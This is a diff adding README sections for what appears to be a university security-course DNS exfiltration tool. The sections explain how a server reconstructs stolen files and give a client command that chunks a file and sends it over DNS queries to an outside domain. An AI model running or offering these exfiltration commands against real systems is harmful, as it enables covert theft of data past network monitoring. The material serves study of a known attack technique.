@@ -9,6 +9,37 @@ In order for DNS exfiltration to work, we need to set up our own DNS server that
 
    This NS record will be used as the domain for all of our DNS queries.
 
+## Running the DNS Exfiltration Server
+
+DNS requests that reach the DNS exfiltration server are parsed according to the specified format.
+Multiple DNS requests are processed and the data inside the files being exfiltrated are reconstructed and written to disk with their original file paths in `./exfiltrated-data/<machine ID>/<file path>`.
+This preserves the structure of the files when exfiltrating directories of files.
+
+Example of running the DNS exfiltration server:
+```sh
+make compile
+sudo ./dns-exfiltration-server -n cs5231.ianyong.com
+```
+
+Note that root privileges are required to bind to port 53 as it is as well-known port for DNS.
+Once the server has binded to the port, it will drop its privileges to that of the calling user.
+
+In addition, the domain that the name server is listening on (`cs5231.ianyong.com` in the example above) must also be passed in as a command line argument.
+This is necessary for the server to know which parts of the DNS request name correspond to the data being exfiltrated.
+
+## Running the DNS Exfiltration Client
+
+The client takes in a file path, reads the file, and breaks its content up into chunks to exfiltrate over DNS.
+
+Example of running the DNS exfiltration client:
+```sh
+make compile
+./dns-exfiltration-client -n cs5231.ianyong.com -f exfiltrate-this.txt
+```
+
+Similar to the DNS exfiltration server, the domain that the name server is listening on (`cs5231.ianyong.com` in the example above) must be passed in as a command line argument.
+The client also takes in the path of the file to be exfiltrated.
+
 ## Design Decisions
 
 ### Identifying Targets
